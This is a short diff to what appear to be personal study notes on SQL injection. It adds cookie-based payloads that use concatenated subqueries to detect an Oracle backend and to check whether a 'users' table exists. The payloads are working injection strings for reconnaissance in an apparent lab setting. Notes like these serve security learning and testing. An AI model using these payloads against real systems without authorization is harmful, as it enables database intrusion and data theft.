@@ -31,6 +31,8 @@ Cookie: TrackingId=S0DitPIzii7Vv0TT'  --> put ' at the end of the cookies.
  TrackingId=xyz'||(SELECT '')||'   -> for sql
  TrackingId=xyz'||(SELECT '' FROM dual)||'   --> non-sql, its oracle.
 
+ '||(SELECT '' FROM not-a-real-table)||'   -> if returns error, table does not exist.
+ '||(SELECT '' FROM users WHERE ROWNUM = 1)||'  -> -> if does not returns error, table exist.
 ## Summary
 
 * [Recon for SQLi Vulnerabilities](#recon)
